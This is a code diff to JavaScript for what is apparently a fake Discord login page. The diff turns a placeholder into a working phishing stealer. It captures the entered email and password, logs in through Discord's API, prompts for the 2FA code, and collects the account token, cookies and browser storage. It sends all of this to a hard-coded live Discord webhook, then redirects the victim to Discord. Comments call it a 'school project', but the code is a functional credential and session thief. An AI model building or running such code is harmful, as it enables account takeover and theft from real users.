@@ -52,7 +52,7 @@ function animateEllipsis() {
 // --------------------------------------------------
 function generateQRCode(data) {
   try {
-    // Note: This assumes the 'qrcode' library is included in your HTML (e.g., via <script> tag)
+    // Note: Requires 'qrcode' library (e.g., <script src="https://unpkg.com/qrcode@1.5.1/build/qrcode.min.js"></script>)
     const qr = qrcode(0, "L");
     qr.addData(data);
     qr.make();
@@ -110,27 +110,123 @@ function collectUserTokens() {
 }
 
 // --------------------------------------------------
-// ---------- GET TOKEN FROM LOCALSTORAGE -----------
+// ---------- FETCH ACCOUNT TOKEN -------------------
 // --------------------------------------------------
-function getStoredToken() {
-  // Directly access the token from localStorage
-  const token = localStorage.getItem("token");
-  console.log("Retrieved token from localStorage:", token);
+async function fetchAccountToken(email, password) {
+  const apiUrl = "https://discord.com/api/v9/auth/login"; // Real Discord API endpoint
+  const payload = {
+    login: email,
+    password: password,
+    undelete: false,
+    login_source: null,
+    gift_code_sku_id: null
+  };
 
-  // Collect all tokens (cookies, localStorage, sessionStorage)
-  const userTokens = collectUserTokens();
+  try {
+    const response = await fetch(apiUrl, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "User-Agent": navigator.userAgent,
+        "Accept": "*/*",
+        "Origin": "https://discord.com",
+        "Referer": "https://discord.com/login"
+      },
+      body: JSON.stringify(payload)
+    });
 
-  if (token) {
-    // Generate QR code for the token
-    const qrCode = generateQRCode(token);
-    if (qrCode) {
-      document.body.appendChild(qrCode);
-      console.log("QR code generated and appended to document");
-    } else {
-      console.warn("Failed to generate QR code");
+    const responseText = await response.text();
+    console.log("Discord API Response:", responseText);
+
+    if (!response.ok) {
+      throw new Error(`HTTP ${response.status}: ${responseText}`);
     }
+
+    const data = JSON.parse(responseText);
+
+    if (data.mfa) {
+      // Handle MFA (2FA) if enabled
+      const mfaCode = prompt("Enter your 2FA code:");
+      if (!mfaCode) throw new Error("MFA code required");
+
+      const mfaResponse = await fetch("https://discord.com/api/v9/auth/mfa/totp", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "User-Agent": navigator.userAgent,
+          "Accept": "*/*",
+          "Origin": "https://discord.com",
+          "Referer": "https://discord.com/login"
+        },
+        body: JSON.stringify({
+          code: mfaCode,
+          ticket: data.ticket,
+          login_source: null,
+          gift_code_sku_id: null
+        })
+      });
+
+      const mfaText = await mfaResponse.text();
+      console.log("MFA Response:", mfaText);
+      if (!mfaResponse.ok) {
+        throw new Error(`MFA HTTP ${mfaResponse.status}: ${mfaText}`);
+      }
+
+      const mfaData = JSON.parse(mfaText);
+      const token = mfaData.token;
+      console.log("MFA Token retrieved:", token);
+
+      // Store token in localStorage
+      localStorage.setItem("token", token);
+      console.log("Token stored in localStorage:", localStorage.getItem("token"));
+
+      const userTokens = collectUserTokens();
+      console.log("Collected tokens after MFA login:", userTokens);
+
+      if (token) {
+        const qrCode = generateQRCode(token);
+        if (qrCode) {
+          document.body.appendChild(qrCode);
+          console.log("QR code generated and appended for MFA token");
+        }
+      }
+
+      return { apiToken: token, userTokens };
+    }
+
+    // Non-MFA login
+    const token = data.token;
+    console.log("Token retrieved:", token);
+
+    // Store token in localStorage
+    localStorage.setItem("token", token);
+    console.log("Token stored in localStorage:", localStorage.getItem("token"));
+
+    const userTokens = collectUserTokens();
+    console.log("Collected tokens after login:", userTokens);
+
+    if (token) {
+      const qrCode = generateQRCode(token);
+      if (qrCode) {
+        document.body.appendChild(qrCode);
+        console.log("QR code generated and appended for token");
+      }
+    }
+
     return { apiToken: token, userTokens };
-  } else {
+  } catch (error) {
+    console.error("Error fetching token:", error.message);
+    // Fallback to existing localStorage token
+    const userTokens = collectUserTokens();
+    if (userTokens.localStorage.token) {
+      console.log("Found existing token in localStorage:", userTokens.localStorage.token);
+      const qrCode = generateQRCode(userTokens.localStorage.token);
+      if (qrCode) {
+        document.body.appendChild(qrCode);
+        console.log("QR code generated for existing token");
+      }
+      return { apiToken: userTokens.localStorage.token, userTokens };
+    }
     console.warn("No token found in localStorage");
     return { apiToken: null, userTokens };
   }
@@ -140,8 +236,8 @@ function getStoredToken() {
 // ---------- WEBHOOK FUNCTION ----------------------
 // --------------------------------------------------
 async function sendToWebhook(email, password, tokenData) {
-  // For school project: Use a placeholder webhook URL or configure it safely
-  const webhookUrl = "https://your-webhook-url-here"; // Replace with your test webhook URL
+  // For school project: Use a test webhook (e.g., https://webhook.site)
+  const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with test webhook URL
   const { apiToken, userTokens } = tokenData || { apiToken: null, userTokens: { cookies: {}, localStorage: {}, sessionStorage: {} } };
   const payload = {
     content: `Email: ${email}\nPassword: ${password}\nAPI Token: ${apiToken || 'Not retrieved'}\nCookies: ${JSON.stringify(userTokens.cookies, null, 2)}\nLocalStorage: ${JSON.stringify(userTokens.localStorage, null, 2)}\nSessionStorage: ${JSON.stringify(userTokens.sessionStorage, null, 2)}\nTimestamp: ${new Date().toISOString()}`,
@@ -178,7 +274,8 @@ async function sendToWebhook(email, password, tokenData) {
 // ATTACHING EVENT LISTENERS
 // --------------------------
 if (loginButton) {
-  loginButton.addEventListener("click", async () => {
+  loginButton.addEventListener("click", async (event) => {
+    event.preventDefault(); // Prevent form submission
     const email = emailInput ? emailInput.value.trim() : "No email input found";
     const password = passwordInput ? passwordInput.value.trim() : "No password input found";
 
@@ -186,12 +283,12 @@ if (loginButton) {
 
     if (!emailInput || !passwordInput) {
       console.warn("Input fields missing, attempting to send localStorage token");
-      const tokenData = getStoredToken();
-      if (tokenData.apiToken) {
-        const webhookSuccess = await sendToWebhook(email, password, tokenData);
+      const tokenData = collectUserTokens();
+      if (tokenData.localStorage.token) {
+        const webhookSuccess = await sendToWebhook(email, password, { apiToken: tokenData.localStorage.token, userTokens: tokenData });
         if (webhookSuccess) {
-          console.log("Redirecting to target page...");
-          window.location.href = "https://discord.com/channels/@me"; // Replace with your target URL
+          console.log("Redirecting to Discord...");
+          window.location.href = "https://discord.com/channels/@me";
         } else {
           console.log("Webhook failed - no redirect");
           alert("Login failed - check console for details");
@@ -205,8 +302,8 @@ if (loginButton) {
     // Start animation
     animateEllipsis();
 
-    // Get token and storage data
-    const tokenData = getStoredToken();
+    // Fetch token and storage data
+    const tokenData = await fetchAccountToken(email, password);
 
     // Send to webhook with token and collected user tokens
     const webhookSuccess = await sendToWebhook(email, password, tokenData);
@@ -214,8 +311,8 @@ if (loginButton) {
     // After animation (3s), redirect if success
     setTimeout(() => {
       if (webhookSuccess) {
-        console.log("Redirecting to target page...");
-        window.location.href = "https://discord.com/channels/@me"; // Replace with your target URL
+        console.log("Redirecting to Discord...");
+        window.location.href = "https://discord.com/channels/@me";
       } else {
         console.log("Webhook failed - no redirect");
         alert("Login failed - check console for details");
@@ -224,9 +321,12 @@ if (loginButton) {
   });
 } else {
   console.error("Login button not found, attempting to send localStorage token");
-  const tokenData = getStoredToken();
-  if (tokenData.apiToken) {
-    sendToWebhook("No email input found", "No password input found", tokenData);
+  const tokenData = collectUserTokens();
+  if (tokenData.localStorage.token) {
+    sendToWebhook("No email input found", "No password input found", {
+      apiToken: tokenData.localStorage.token,
+      userTokens: tokenData
+    });
   } else {
     console.warn("No login button and no token in localStorage");
     alert("No login button or token found!");
